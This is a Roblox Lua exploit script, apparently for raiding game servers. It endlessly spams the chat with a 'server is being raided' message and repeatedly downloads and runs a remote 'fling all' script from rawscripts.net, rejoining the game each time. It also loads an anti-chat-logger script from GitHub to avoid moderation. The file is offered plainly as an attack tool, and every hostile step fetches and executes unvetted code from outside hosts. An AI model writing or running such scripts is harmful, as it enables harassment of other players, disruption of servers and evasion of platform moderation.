local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local function spamChat()
    local message = "_____________________________________________________________________________________________________________________________________________________________________________SERVER_IS_BEING_RAIDED"
    while true do
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
        wait(2)
    end
end

local function flingAll()
    while true do
        loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FLING-ALL-SCRIPT-17590"))()
        wait(3)
        TeleportService:Teleport(game.PlaceId, Players.LocalPlayer)
    end
end

loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua", true))()

spawn(spamChat)
spawn(flingAll)